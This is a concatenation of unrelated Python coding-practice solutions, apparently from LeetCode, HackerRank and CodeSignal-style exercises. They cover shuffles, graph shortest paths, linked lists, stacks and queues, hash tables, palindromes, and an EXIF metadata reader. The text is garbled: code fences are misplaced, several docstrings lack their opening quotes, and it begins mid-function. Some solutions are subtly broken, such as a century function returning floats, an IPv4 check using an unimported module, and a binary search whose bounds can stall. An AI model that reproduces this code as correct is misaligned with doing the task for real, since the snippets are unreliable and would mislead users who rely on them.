        b = random.randint(0, len(LIST) - 1)
        LIST[a], LIST[b] = LIST[b], LIST[a]
    return LIST


if __name__ == "__main__":
    integers = [0, 1, 2, 3, 4, 5, 6, 7]
    strings = ["python", "says", "hello", "!"]
    print("Fisher-Yates Shuffle:")
    print("List", integers, strings)
    print("FY Shuffle", FYshuffle(integers), FYshuffle(strings))

# You are playing the following Flip Game with your friend: Given a string that
# contains only these two characters: + and -, you and your friend take turns to
# flip two consecutive "++" into "--". The game ends when a person can no longer
# make a move and therefore the other person will be the winner.
#
# Write a function to compute all possible states of the string after one valid move.
#
# Input: s = "++++"
# Output:
# [
#   "--++",
#   "+--+",
#   "++--"
# ]


class Solution:
    def generatePossibleNextMoves(self, s):
        res = []
        strs = []
        for c in s:
            strs.append(c)

        for i in range(len(strs) - 1):
            if strs[i] == "+" and strs[i + 1] == "+":
                res.append(s[:i] + "--" + s[i + 2 :])

        return res

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the flippingBits function below.
def flippingBits(n):
    max = (2 ** 32) - 1
    return max - n


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    q = int(input())

    for q_itr in range(q):
        n = int(input())

        result = flippingBits(n)

        fptr.write(str(result) + "\n")

    fptr.close()

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the flippingMatrix function below.
def flippingMatrix(matrix):
    n = len(matrix)
    seen = set()
    maxes = []
    for i in range(len(matrix) - 1):
        for j in range(i + 1, len(matrix[0])):
            if (i, j) not in seen:
                ri, rj = mirror_row(i, j, n)
                di, dj = mirror_col(ri, rj, n)
                li, lj = mirror_row(di, dj, n)
                gp = [matrix[i][j], matrix[ri][rj], matrix[di][dj], matrix[li][lj]]
                seen |= set([(i, j), (ri, rj), (di, dj), (li, lj)])
                maxes.append(max(gp))
    return sum(maxes)


def mirror_row(i, j, n):
    return i, n - j - 1


def mirror_col(i, j, n):
    return n - i - 1, j


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    q = int(input())

    for q_itr in range(q):
        n = int(input())

        matrix = []

        for _ in range(2 * n):
            matrix.append(list(map(int, input().rstrip().split())))

        result = flippingMatrix(matrix)

        fptr.write(str(result) + "\n")

    fptr.close()

from __future__ import print_function


def printDist(dist, V):
    print("\nThe shortest path matrix using Floyd Warshall algorithm\n")
    for i in range(V):
        for j in range(V):
            if dist[i][j] != float("inf"):
                print(int(dist[i][j]), end="\t")
            else:
                print("INF", end="\t")
        print()


def FloydWarshall(graph, V):
    dist = [[float("inf") for i in range(V)] for j in range(V)]

    for i in range(V):
        for j in range(V):
            dist[i][j] = graph[i][j]

    for k in range(V):
        for i in range(V):
            for j in range(V):
                if (
                    dist[i][k] != float("inf")
                    and dist[k][j] != float("inf")
                    and dist[i][k] + dist[k][j] < dist[i][j]
                ):
                    dist[i][j] = dist[i][k] + dist[k][j]

    printDist(dist, V)


# MAIN
V = int(input("Enter number of vertices: "))
E = int(input("Enter number of edges: "))

graph = [[float("inf") for i in range(V)] for j in range(V)]

for i in range(V):
    graph[i][i] = 0.0

for i in range(E):
    print("\nEdge ", i + 1)
    src = int(input("Enter source:"))
    dst = int(input("Enter destination:"))
    weight = float(input("Enter weight:"))
    graph[src][dst] = weight

FloydWarshall(graph, V)

def messageFromBinaryCode(code):
    phrase = ""
    bits = [int(code[i * 8 : i * 8 + 8], 2) for i in range(len(code) // 8)]
    for j in range(len(bits)):
        phrase += chr(bits[j])
    return phrase
````

```pyGiven a year, return the century it is in. The first century spans from the year 1 up to and including the year 100, the second -
from the year 101 up to and including the year 200, etc.

Example:
- For year = 1905, the output should be centuryFromYear(year) = 20;
- For year = 1700, the output should be centuryFromYear(year) = 17. """


def centuryFromYear(year):
    # We begin by getting the INTEGER quotient of the division of the year given by 100.
    # This will give us the first two digits, which would be the century.
    cen = int(year / 100)
    # However, we should keep in mind that we refer to years between e.g. 1701 - 1800
    # as the "18th century". Hence, we implement a while loop, where the condition is
    # that the year is a positive integer (which is always true). If the remainder of the
    # division of the year by 100 is 0, then the two first digits of the division represent
    # the century. Otherwise, if the remainder is non-zero, the century is found by adding 1
    # to the result of the division (i.e. "cen").
    while year >= 1:
        if year % 100 == 0:
            return year / 100
        else:
            return cen + 1

# In a row of trees, the i-th tree produces fruit with type tree[i].
#
# You start at any tree of your choice, then repeatedly perform the following steps:
#
# Add one piece of fruit from this tree to your baskets.  If you cannot, stop.
# Move to the next tree to the right of the current tree.  If there is no tree to the right, stop.
# Note that you do not have any choice after the initial choice of starting tree: you must perform
# step 1, then step 2, then back to step 1, then step 2, and so on until you stop.
#
# You have two baskets, and each basket can carry any quantity of fruit, but you want each basket
# to only carry one type of fruit each.
#
# What is the total amount of fruit you can collect with this procedure?
#
# Input: [1, 2, 1]
# Output: 3
# Explanation: We can collect[1, 2, 1].
#
# Input: [0,1,2,2]
# Output: 3
# Explanation: We can collect [1,2,2].
# If we started at the first tree, we would only collect [0, 1].
#
# Input: [1,2,3,2,2]
# Output: 4
# Explanation: We can collect [2,3,2,2].
# If we started at the first tree, we would only collect [1, 2].
#
# Input: [3,3,3,1,2,1,1,2,3,3,4]
# Output: 5
# Explanation: We can collect [1,2,1,1,2].
# If we started at the first tree or the eighth tree, we would only collect 4 fruits.


class Solution:
    def totalFruits(self, Tree):
        last_fruit = -1
        second_last_fruit = -1
        last_fruit_count = 0
        current_max = 0
        maximum = 0

        for fruit in Tree:
            if fruit == last_fruit or fruit == second_last_fruit:
                current_max += 1
            else:
                current_max = last_fruit_count + 1

            if fruit == last_fruit:
                last_fruit_count += 1
            else:
                second_last_fruit = last_fruit
                last_fruit = fruit
                last_fruit_count = 1
            maximum = max(current_max, maximum)
        return maximum


if __name__ == "__main__":
    arr = [3, 3, 3, 1, 2, 1, 1, 2, 3, 3, 4]
    print(Solution().totalFruits(arr))
    arr = [1, 1, 6, 5, 6, 6, 1, 1, 1, 1]
    print(Solution().totalFruits(arr))

def find_gcd(x, y):

    while y:
        x, y = y, x % y

    return x


l = [2, 4, 6, 8, 16]

num1 = l[0]
num2 = l[1]
gcd = find_gcd(num1, num2)

for i in range(2, len(l)):
    gcd = find_gcd(gcd, l[i])

print(gcd)

# Given n pairs of parentheses, write a function to generate
# all combinations of well-formed parentheses.
#
# For example, given n = 3, a solution set is:
#
# [
#   "((()))",
#   "(()())",
#   "(())()",
#   "()(())",
#   "()()()"
# ]


class Solution:
    def generateParenthesis(self, n):
        res = []

        def backtrack(S, left, right):

            if len(S) == 2 * n:
                res.append(S)
                return

            if left < n:
                backtrack(S + "(", left + 1, right)
            if right < left:
                backtrack(S + ")", left, right + 1)

        backtrack("", 0, 0)
        return res

# For your reference:
#
# SinglyLinkedListNode:
#     int data
#     SinglyLinkedListNode next
#
#
def getNode(head, positionFromTail):
    length = 0
    ptr = head
    while ptr:
        length += 1
        ptr = ptr.next
    if length == 1:
        return head.data
    ptr = head
    for _ in range(0, length - positionFromTail - 1):
        ptr = ptr.next
    return ptr.data

import requests
import sys
from subprocess import call

user = sys.argv[1]

r = requests.get("https://api.github.com/users/{0}/gists".format(user))

for i in r.json():
    call(["git", "clone", i["git_pull_url"]])

    description_file = "./{0}/description.txt".format(i["id"])
    with open(description_file, "w") as f:
        f.write("{0}\n".format(i["description"]))

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the getMinimumCost function below.
def getMinimumCost(k, c):
    c = sorted(c)[::-1]
    m = 1
    cost = 0
    for i in range(len(c)):
        if (i + 1) > (k * m):
            m += 1
        cost = cost + (m * c[i])
    return cost


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    nk = input().split()

    n = int(nk[0])

    k = int(nk[1])

    c = list(map(int, input().rstrip().split()))

    minimumCost = getMinimumCost(k, c)

    fptr.write(str(minimumCost) + "\n")

    fptr.close()

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the gridChallenge function below.
def gridChallenge(grid):
    for i in range(len(grid)):
        grid[i] = sorted(grid[i])
    for i in range(len(grid[0])):
        for j in range(1, len(grid)):
            if grid[j - 1][i] <= grid[j][i]:
                continue
            return "NO"
    return "YES"


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    t = int(input())

    for t_itr in range(t):
        n = int(input())

        grid = []

        for _ in range(n):
            grid_item = input()
            grid.append(grid_item)

        result = gridChallenge(grid)

        fptr.write(result + "\n")

    fptr.close()

# We are playing the Guess Game. The game is as follows:
#
# I pick a number from 1 to n. You have to guess which number I picked.
#
# Every time you guess wrong, I'll tell you whether the number is higher or lower.
#
# You call a pre-defined API guess(int num) which returns 3 possible results (-1, 1, or 0):
#
# -1 : My number is lower
#  1 : My number is higher
#  0 : Congrats! You got it!
# Example :
#
# Input: n = 10, pick = 6
# Output: 6


class Solution:
    def guessNumber(self, n: int) -> int:

        if guess(n) == 0:
            return n

        def helper(low, high):
            k = (low + high) // 2
            if guess(k) == 0:
                return k
            elif guess(k) == 1:
                return helper(k, high)
            else:
                return helper(low, k)

        return helper(0, n)

# Write an algorithm to determine if a number is "happy".
#
# A happy number is a number defined by the following process: Starting with
# any positive integer, replace the number by the sum of the squares of its digits,
# and repeat the process until the number equals 1 (where it will stay), or it loops endlessly
# in a cycle which does not include 1. Those numbers for which this process ends in 1 are happy numbers.
#
# Example:
#
# Input: 19
# Output: true
# Explanation:
# 12 + 92 = 82
# 82 + 22 = 68
# 62 + 82 = 100
# 12 + 02 + 02 = 1


class Solution:
    def isHappy(self, n):
        slow = n
        fast = self.getNum(n)

        while fast != 1 and slow != fast:
            slow = self.getNum(slow)
            fast = self.getNum(self.getNum(fast))

        return fast == 1

    def getNum(self, num):
        res = 0
        while num > 0:
            res += (num % 10) ** 2
            num = num // 10
        return res
```

````py
Hashtables (associative arrays)```


```py


# linear probing
class HashTable(object):
    def __init__(self):
        self.size = 10
        self.keys = [None] * self.size
        self.values = [None] * self.size

    def put(self, key, data):

        index = self.hashfunction(key)

        # not None -> it is a collision !!!
        while self.keys[index] is not None:
            if self.keys[index] == key:
                self.values[index] = data  # update
                return

            # rehash try to find another slot
            index = (index + 1) % self.size

        # insert
        self.keys[index] = key
        self.values[index] = data

    def get(self, key):

        index = self.hashfunction(key)

        while self.keys[index] is not None:
            if self.keys[index] == key:
                return self.values[index]

            index = (index + 1) % self.size

        # it means the key is not present in the associative array
        return None

    def hashfunction(self, key):
        sum = 0
        for pos in range(len(key)):
            sum = sum + ord(key[pos])

        return sum % self.size


table = HashTable()

table.put("apple", 10)
table.put("orange", 20)
table.put("car", 30)
table.put("table", 40)

print(table.get("car"))

# Winter is coming! Your first job during the contest is to design a standard heater
# with fixed warm radius to warm all the houses.
#
# Now, you are given positions of houses and heaters on a horizontal line, find out
# minimum radius of heaters so that all houses could be covered by those heaters.
#
# So, your input will be the positions of houses and heaters seperately, and your
# expected output will be the minimum radius standard of heaters.
#
# Note:
#
# Numbers of houses and heaters you are given are non-negative and will not exceed 25000.
# Positions of houses and heaters you are given are non-negative and will not exceed 10^9.
# As long as a house is in the heaters' warm radius range, it can be warmed.
# All the heaters follow your radius standard and the warm radius will the same.
#
# Input: [1,2,3],[2]
# Output: 1
# Explanation: The only heater was placed in the position 2, and if we use the
# radius 1 standard, then all the houses can be warmed.
#
#
# Input: [1,2,3,4],[1,4]
# Output: 1
# Explanation: The two heater was placed in the position 1 and 4. We need to use
# radius 1 standard, then all the houses can be warmed.


class Solution:
    def findRadius(self, houses, heaters):
        houses.sort()
        heaters.sort()
        heaters = [float("-inf")] + heaters + [float("inf")]

        i = j = radius = 0

        while i < len(houses):
            if heaters[j] >= houses[i]:
                dist = min(heaters[j] - houses[i], houses[i] - heaters[j - 1])
                i += 1
                radius = max(radius, dist)

            else:
                j += 1

        return radius

#!/bin/python3

import math
import os
import random
import re
import sys

# Complete the highestValuePalindrome function below.
def highestValuePalindrome(s, n, k):
    changes = 0
    l = 0
    h = len(s) - 1
    s = list(s)
    for i in range(0, n // 2):
        if s[i] != s[-i - 1]:
            changes += 1
    if changes > k:
        return "-1"
    while h >= l:
        if k <= 0:
            break
        if s[l] == s[h]:
            if k > 1 and (k - 2 >= (changes)) and s[l] != "9":
                s[l] = "9"
                s[h] = "9"
                k -= 2
        else:
            if (k > 1) and ((k - 2) >= changes - 1):
                if s[l] != "9":
                    s[l] = "9"
                    k -= 1
                if s[h] != "9":
                    s[h] = "9"
                    k -= 1
            else:
                if s[l] > s[h]:
                    s[h] = s[l]
                else:
                    s[l] = s[h]
                k -= 1
            changes -= 1
        if l == h and k > 0:
            s[l] = "9"
            k -= 1
        l += 1
        h -= 1
    a = ""
    for i in range(len(s)):
        a += s[i]
    if a == a[::-1]:
        return a
    else:
        return "-1"


if __name__ == "__main__":
    fptr = open(os.environ["OUTPUT_PATH"], "w")

    nk = input().split()

    n = int(nk[0])

    k = int(nk[1])

    s = input()

    result = highestValuePalindrome(s, n, k)

    fptr.write(result + "\n")

    fptr.close()

# You are a professional robber planning to rob houses along a street. Each house
# has a certain amount of money stashed, the only constraint stopping you from robbing
# each of them is that adjacent houses have security system connected and it will
# automatically contact the police if two adjacent houses were broken into on the same night.
#
# Given a list of non-negative integers representing the amount of money of each
# house, determine the maximum amount of money you can rob tonight without alerting the police.
#
# Example 1:
#
# Input: [1,2,3,1]
# Output: 4
# Explanation: Rob house 1 (money = 1) and then rob house 3 (money = 3).
#              Total amount you can rob = 1 + 3 = 4.
# Example 2:
#
# Input: [2,7,9,3,1]
# Output: 12
# Explanation: Rob house 1 (money = 2), rob house 3 (money = 9) and rob house 5 (money = 1).
# Total amount you can rob = 2 + 9 + 1 = 12.


class Solution:
    def rob(self, nums):
        prevMax = 0
        currMax = 0

        for num in nums:
            prevMax, currMax = currMax, max(prevMax + num, currMax)

        return currMax

def isIPv4Address(inputString):
    str_split = inputString.split(".")
    count = 0
    if len(str_split) != 4:
        return False
    for i in range(0, 4):
        if str_split[i] == "" or str_split[i] == "00" or str_split[i] == "01":
            return False
        if re.search("[a-zA-Z]", str_split[i]):
            count += 1
            if count > 0:
                return False
        if str_split[i].isnumeric():
            if int(str_split[i]) < 0:
                return False
            if int(str_split[i]) > 255:
                return False
    return True

def Rotate(arr):
    temp = []
    for i in range(len(arr)):
        for j in range(0, len(arr)):
            if i != j and i < j:
                arr[i][j], arr[j][i] = arr[j][i], arr[i][j]

    for l in arr:
        l.reverse()
        print(l)


arr = [[1, 2, 3], [4, 5, 6], [7, 8, 9]]

Rotate(arr)

# Photo metadata is a set of data describing and providing information about rights and administration of an image.

# importing os module
import os
from PIL import Image

# Importing Pillow Python Imaging Library:that adds support for opening, manipulating, and saving many different image file formats.
from PIL.ExifTags import TAGS

# importing required modules

# print(TAGS) checking if libraries are imported or not which basically returns a key value pairs of all the metadata.

# Enter your Image here, here it is as image.jpg
image_file = "image.jpg"

# on execution an object of Image type is returned and stored in image_file variable.

try:
    image = Image.open(image_file)
except IOError:
    pass
# raise an IOError if file cannot be found,or the image cannot be opened.

# dictionary to store metadata keys and value pairs.
exif = {}

# iterating over the dictionary
for tag, value in image._getexif().items():

    # extarcting all the metadata as key and value pairs and converting them from numerical value to string values
    if tag in TAGS:
        exif[TAGS[tag]] = value

# checking if image is copyrighted
try:
    if "Copyright" in exif:
        print("Image is Copyrighted, by ", exif["Copyright"])
except KeyError:
    pass

print()
print("Displaying all the metadatas of the image: \n")
print(exif)

class MyQueue:
    def __init__(self):
        """
        Initialize your data structure here.
        """
        self.s1 = []
        self.s2 = []

    def push(self, x: int) -> None:
        """
        Push element x to the back of queue.
        """
        self.s1.append(x)

    def pop(self) -> int:
        """
        Removes the element from in front of queue and returns that element.
        """
        while len(self.s1) > 1:
            self.s2.append(self.s1.pop())
        temp = self.s1.pop()
        while len(self.s2):
            self.s1.append(self.s2.pop())
        return temp

    def peek(self) -> int:
        """
        Get the front element.
        """
        return self.s1[0]

    def empty(self) -> bool:
        """
        Returns whether the queue is empty.
        """
        return False if len(self.s1) else True


# Your MyQueue object will be instantiated and called as such:
# obj = MyQueue()
# obj.push(x)
# param_2 = obj.pop()
# param_3 = obj.peek()
# param_4 = obj.empty()

## Implementation Using queue.Queue()
## Faster than 67%

from queue import Queue


class MyStack:
    def __init__(self):
        """
        Initialize your data structure here.
        """
        self.q1 = Queue(maxsize=0)
        self.q2 = Queue(maxsize=0)

    def push(self, x: int) -> None:
        """
        Push element x onto stack.
        """
        self.q1.put(x)

    def pop(self) -> int:
        """
        Removes the element on top of the stack and returns that element.
        """
        while self.q1.qsize() > 1:
            self.q2.put(self.q1.get())
        temp = self.q1.get()
        while self.q2.qsize() > 0:
            self.q1.put(self.q2.get())
        return temp

    def top(self) -> int:
        """
        Get the top element.
        """
        while self.q1.qsize() > 1:
            self.q2.put(self.q1.get())
        temp = self.q1.get()
        while self.q2.qsize() > 0:
            self.q1.put(self.q2.get())
        self.q1.put(temp)
        return temp

    def empty(self) -> bool:
        """
        Returns whether the stack is empty.
        """
        return self.q1.empty()


## Implementation using Deque
## Faster than 100%

from collections import deque


class MyStack:
    def __init__(self):
        """
        Initialize your data structure here.
        """
        self.q = deque()

    def push(self, x: int) -> None:
        """
        Push element x onto stack.
        """
        self.q.append(x)

    def pop(self) -> int:
        """
        Removes the element on top of the stack and returns that element.
        """
        return self.q.pop()

    def top(self) -> int:
        """
        Get the top element.
        """
        temp = self.q.pop()
        self.q.append(temp)
        return temp

    def empty(self) -> bool:
        """
        Returns whether the stack is empty.
        """
        return False if len(self.q) else True


# Your MyStack object will be instantiated and called as such:
# obj = MyStack()
# obj.push(x)
# param_2 = obj.pop()
# param_3 = obj.top()
# param_4 = obj.empty()
````

```pyWrite a function that reverses characters in (possibly nested) parentheses in the input string.
Input strings will always be well-formed with matching ()s.

Example:
- For inputString = "(bar)", the output should be reverseInParentheses(inputString) = "rab";
- For inputString = "foo(bar)baz", the output should be reverseInParentheses(inputString) = "foorabbaz";
- For inputString = "foo(bar)baz(blim)", the output should be reverseInParentheses(inputString) = "foorabbazmilb";
- For inputString = "foo(bar(baz))blim", the output should be reverseInParentheses(inputString) = "foobazrabblim".
Because "foo(bar(baz))blim" becomes "foo(barzab)blim" and then "foobazrabblim"."""


def reverseInParentheses(inputString):
    # Step 1: We create a for-loop that goes over all elements of the input string. If element i is an opening bracket, then i
    # is defined as "start". In a similar manner, if element i is a closing bracket, i is defined as "end". NOTE THAT
    # if you write it as "i = start" or "i = end", an error will pop up (tested) as you would have not defined any variables
    # under those names, whilst the way that is written now you define as "start" and "end" elements that are
    # "(" and ")" respectively.
    for i in range(len(inputString)):
        if inputString[i] == "(":
            start = i
        if inputString[i] == ")":
            end = i
            # Step 2: Furthermore, we apply the function inside itself and concatenate the individual modified parts:
            # the part of the input string up to (and NOT including) the "starting" point (i.e. opening bracket) is left intact.
            # The same goes for the part of the input string one element AFTER the "ending" point (i.e. closing bracket)
            # till the actual end of the input string. The part of the input string that is located one element after
            # the starting point ("start"+1 included) and up to the "ending" point NOT included is reversed.
            return reverseInParentheses(
                inputString[:start]
                + inputString[start + 1 : end][::-1]
                + inputString[end + 1 :]
            )
    # Step 3: To conclude, we return the modified input string.
    return inputString
```

```pyGiven a sequence of integers as an array, determine whether it is possible to obtain a strictly increasing sequence
by removing no more than one element from the array.

Note: sequence a0, a1, ..., an is considered to be a strictly increasing if a0 < a1 < ... < an.
Sequence containing only one element is also considered to be strictly increasing.

Example:
- For sequence = [1, 3, 2, 1], the output should be almostIncreasingSequence(sequence) = false.
There is no one element in this array that can be removed in order to get a strictly increasing sequence.
- For sequence = [1, 3, 2], the output should be almostIncreasingSequence(sequence) = true.
You can remove 3 from the array to get the strictly increasing sequence [1, 2].
Alternately, you can remove 2 to get the strictly increasing sequence [1, 3]."""


def almostIncreasingSequence(sequence):
    # Step 1: We begin by assigning the length of the given sequence to the variable n.
    n = len(sequence)
    # Step 2: By definition, if the sequence contains up to 1 elements, it is considered to be strictly increasing.
    if n <= 2:
        return True
    # Step 3: We set up two counters, namely c1 and c2, so that we count how many elements should be removed.
    # NOTE THAT c1 refers ONLY to adjacent elements whilst c2 refers to elements just before and just after the i-th element.
    c1 = 0
    c2 = 0
    # Step 4: This for-loop (and its content) is a tricky part. The range of the for-loop starts from 1 and goes all the way to (n-1)th element.
    # BE CAREFUL: We set n-1 to avoid getting our index out of range in the second if statement inside the for-loop.
    for i in range(1, n - 1):
        # Step 5: If the element prior to the index element i has a bigger value than i, we add 1 hit to the first counter.
        if sequence[i - 1] >= sequence[i]:
            c1 += 1
        # Step 6: If the element just before the index element i has a bigger value than the element just after i,
        # we add 1 hit to the second counter.
        if sequence[i - 1] >= sequence[i + 1]:
            c2 += 1
    # Step 7: If the element two places to the left of the index element i has a bigger value than the element prior to i,
    # we add 1 hit to the first counter.
    if sequence[n - 1] <= sequence[n - 2]:
        c1 += 1
    # Step 8: If BOTH of the counters have up to 1 hit (that means 0 or 1 EACH), then the sequence is almost increasing.
    if c1 <= 1 and c2 <= 1:
        return True
    else:
        return False

class CustomStack:
    def __init__(self, maxSize: int):
        self.stack = []
        self.maxSize = maxSize

    def push(self, x: int) -> None:
        if len(self.stack) < self.maxSize:
            self.stack.append(x)

    def pop(self) -> int:
        if len(self.stack) != 0:
            return self.stack.pop()
        else:
            return -1

    def increment(self, k: int, val: int) -> None:
        for i in range(min(k, len(self.stack))):
            self.stack[i] += val


# Your CustomStack object will be instantiated and called as such:
# obj = CustomStack(maxSize)
# obj.push(x)
# param_2 = obj.pop()
# obj.increment(k,val)

# string indexing
```

````py
Indexing
0  1  2  3  4
H  E  L  L  O```


```py

message = "Hello"
print(message[0])  # this will print H that is first letter in the string
print(message[1:4])  # this will print from index one to index four
print(message[:3])  # this will print from starting to index 3
print(message[2:])  # this will print from index 2 till end
print(message[:])  # this prints whole string
print(message[0:4:2])  # this escapes 2 characters from string

# negative Indexing```


```py
negative Indexing
  P  y  t  h  o  n
 -6 -5 -4 -3 -2 -1```


```py

awesome = "Python is awesome"
print(awesome[:-1])  # -1 prints last character
print(awesome[-2])  # this prints m from starting
print(awesome[-7:])  # try this one out in interpreter

print("You are " + awesome[10:] + " you are learning " + awesome[:6])

# Given a binary search tree and a node in it, find the in-order successor of that node in the BST.
#
# The successor of a node p is the node with the smallest key greater than p.val.
#
# Input: root = [2, 1, 3], p = 1
# Output: 2
# Explanation: 1
# 's in-order successor node is 2. Note that both p and the return value is of TreeNode type.
#
# Input: root = [5,3,6,2,4,null,null,1], p = 6
# Output: null
# Explanation: There is no in-order successor of the current node, so the answer is null.


class TreeNode:
    def __init__(self, x):
        self.val = x
        self.left = None
        self.right = None


class Solution:
    def inorderSuccessor(self, root, p):

        if p.right:
            curr = p.right
            while curr.left:
                curr = curr.left
            return curr

        stack, inorder = [], float("inf")

        while stack or root:
            while root:
                stack.append(root)
                root = root.left

            root = stack.pop()

            if inorder == p.val:
                return root

            inorder = root.val

            root = root.right

        return None

# For your reference:
#
# SinglyLinkedListNode:
#     int data
#     SinglyLinkedListNode next
#
#
def insertNodeAtPosition(head, data, position):
    temp = head
    ptr = 1
    while ptr != position:
        temp = temp.next
        ptr += 1
    sec = temp.next
    temp.next = SinglyLinkedListNode(data)
    temp = temp.next
    temp.next = sec
    return head

# For your reference:
#
# SinglyLinkedListNode:
#     int data
#     SinglyLinkedListNode next
#
#
def insertNodeAtHead(llist, data):
    temp = SinglyLinkedListNode(data)
    temp.next = llist
    return temp

# For your reference:
#
# SinglyLinkedListNode:
#     int data
#     SinglyLinkedListNode next
#
#
def insertNodeAtTail(head, data):
    if head == None:
        head = SinglyLinkedListNode(data)
        return head
    temp = head
    while temp.next != None:
        temp = temp.next
    temp.next = SinglyLinkedListNode(data)
    return head

# For your reference:
#
# DoublyLinkedListNode:
#     int data
#     DoublyLinkedListNode next
#     DoublyLinkedListNode prev
#
#
def sortedInsert(head, data):
    ptr = head
    if data <= ptr.data:
        dummy = DoublyLinkedListNode(data)
        dummy.next = head
        head.prev = dummy
        return dummy
    while ptr:
        if data >= ptr.data:
            if ptr.next == None:
                ptr.next = DoublyLinkedListNode(data)
                dummy = ptr
                ptr = ptr.next
                ptr.prev = dummy
                return head
            if ptr.next.data >= data:
                print(ptr.next.data, ptr.data, data)
                temp = DoublyLinkedListNode(data)
                dummy = ptr.next
                ptr.next = temp
                temp.next = dummy
                dummy.prev = temp
                temp.prev = ptr
                return head
        ptr = ptr.next

# Given a node from a Circular Linked List which is sorted in ascending order,
# write a function to insert a value insertVal into the list such that it remains
# a sorted circular list. The given node can be a reference to any single node in
# the list, and may not be necessarily the smallest value in the circular list.
#
# If there are multiple suitable places for insertion, you may choose any place
# to insert the new value. After the insertion, the circular list should remain sorted.
#
# If the list is empty (i.e., given node is null), you should create a new single
# circular list and return the reference to that single node. Otherwise, you should
# return the original given node.
#
# Input: head = [3,4,1], insertVal = 2
# Output: [3,4,1,2]
#
# Input: head = [], insertVal = 1
# Output: [1]
# Explanation: The list is empty (given head is null). We create a new single
# circular list and return the reference to that single node.
#
# Input: head = [1], insertVal = 0
# Output: [1,0]


class Node:
    def __init__(self, val=None, next=None):
        self.val = val
        self.next = next


class Solution:
    def insert(self, head, insertVal):
        if not head:
            head = Node(insertVal)
            head.next = head
            return head
        prev = head
        curr = head.next
        isinsert = False

        while True:
            if prev.val <= insertVal <= curr.val:
                isinsert = True
            elif prev.val > curr.val:
                if insertVal > prev.val or insertVal < curr.val:
                    isinsert = True
            if isinsert:
                prev.next = Node(insertVal, curr)
                return head
            prev, curr = curr, curr.next
            if prev == head:
                break
        prev.next = Node(insertVal, curr)
        return head


if __name__ == "__main__":
    # [1,3,4]
    node = Node(1)
    node.next = Node(3)
    node.next.next = Node(4)
    node.next.next.next = node
    ans = Solution().insert(node, 2)
    head = ans
    while ans:
        print(ans.val)
        ans = ans.next
        if ans == head:
            break

import math


class Solution:
    def integerReplacement(self, n: int) -> int:
        s = 0
        while n != 1:
            if n % 2 == 0:
                n //= 2
                s += 1
                continue
            if n == 3:
                return s + 2
            else:
                if math.ceil(math.log2(n - 1)) == math.floor(math.log2(n - 1)):
                    n -= 1
                elif (math.ceil(math.log2(n + 1)) == math.floor(math.log2(n + 1))) or (
                    (n + 1) % 4 == 0
                ):
                    n += 1
                else:
                    n -= 1
                s += 1
        return s

class Solution:
    def intToRoman(self, num: int) -> str:
        dic = {
            1000: "M",
            900: "CM",
            500: "D",
            400: "CD",
            100: "C",
            90: "XC",
            50: "L",
            40: "XL",
            10: "X",
            9: "IX",
            5: "V",
            4: "IV",
            1: "I",
        }
        ans = ""
        for i in dic:
            while num >= i:
                ans += dic[i]
                num -= i
        return ans

class Solution:
    # @param A : tuple of integers
    # @param B : tuple of integers
    # @return a list of integers
    def intersect(self, A, B):
        s1 = 0
        s2 = 0
        e1 = len(A)
        e2 = len(B)
        intersection = []
        while s2 < e2 and s1 < e1:
            if A[s1] == B[s2]:
                intersection.append(A[s1])
                s1 += 1
                s2 += 1
            elif A[s1] < B[s2]:
                s1 += 1
            else:
                s2 += 1
        return intersection
````

```py
349. Intersection of Two Arrays

DescriptionHintsSubmissionsDiscussSolution
Given two arrays, write a function to compute their intersection.

Example 1:

Input: nums1 = [1,2,2,1], nums2 = [2,2]
Output: [2]
Example 2:

Input: nums1 = [4,9,5], nums2 = [9,4,9,8,4]
Output: [9,4]
Note:

Each element in the result must be unique.
The result can be in any order.
```

```py


class Solution:
    def intersection(self, nums1, nums2):
        """
        :type nums1: List[int]
        :type nums2: List[int]
        :rtype: List[int]
        """

        # declaring an empty array for comparing
        result = []

        # final array initialization
        finalResult = []

        for i in nums1:
            for j in nums2:

                if i == j:

                    result.append(i)

        # removing duplicates
        finalResult = set(result)

        return list(finalResult)

class Solution:
    def intersect(self, nums1: List[int], nums2: List[int]) -> List[int]:
        if len(nums1) > len(nums2):
            i = 0
            while i < len(nums2):
                if nums2[i] in set(nums1):
                    nums1.remove(nums2[i])
                    i += 1
                else:
                    nums2.remove(nums2[i])
            return nums2
        else:
            i = 0
            while i < len(nums1):
                if nums1[i] in set(nums2):
                    nums2.remove(nums1[i])
                    i += 1
                else:
                    nums1.remove(nums1[i])
            return nums1


# Alternate Approach

from collections import Counter


class Solution:
    def intersect(self, nums1: List[int], nums2: List[int]) -> List[int]:
        return list((Counter(nums1) & Counter(nums2)).elements())

# Write a program to find the node at which the intersection of two singly linked lists begins.

# intersection of two Linked list


class ListNode:
    def __init__(self, val):
        self.val = val
        self.next = None


class Solution:
    def getIntersectionNode(self, headA, headB):
        nodeA = headA
        nodeB = headB
        countA = self.count(nodeA)
        countB = self.count(nodeB)
        skip = abs(countA - countB)

        if countA - countB > 0:
            for i in range(skip):
                nodeA = nodeA.next
        else:
            for i in range(skip):
                nodeB = nodeB.next

        while nodeA is not None and nodeB is not None:
            if nodeA.next == nodeB:
                return nodeA.next
            if nodeA == nodeB:
                return nodeA
            nodeA = nodeA.next
            nodeB = nodeB.next
        return None

    def count(self, node):
        counter = 0
        while node:
            counter += 1
            node = node.next
        return counter


if __name__ == "__main__":
    arr1 = [4, 1]
    arr2 = [5, 0, 1]
    arr3 = [8, 4, 5]
    node1 = ListNode(arr1[0])
    node2 = ListNode(arr2[0])
    node3 = ListNode(arr3[0])
    n1 = node1
    n2 = node2
    n3 = node3

    for i in arr3[1:]:
        n3.next = ListNode(i)
        n3 = n3.next
    for i in arr1[1:]:
        n1.next = ListNode(i)
        n1 = n1.next
    n1.next = node3

    for i in arr2[1:]:
        n2.next = ListNode(i)
        n2 = n2.next
    n2.next = node3
    finalnode = Solution().getIntersectionNode(node1, node2)
    print(finalnode, finalnode.val)

# Given two arrays, write a function to compute their intersection.
#
# Example 1:
#
# Input: nums1 = [1,2,2,1], nums2 = [2,2]
# Output: [2,2]
# Example 2:
#
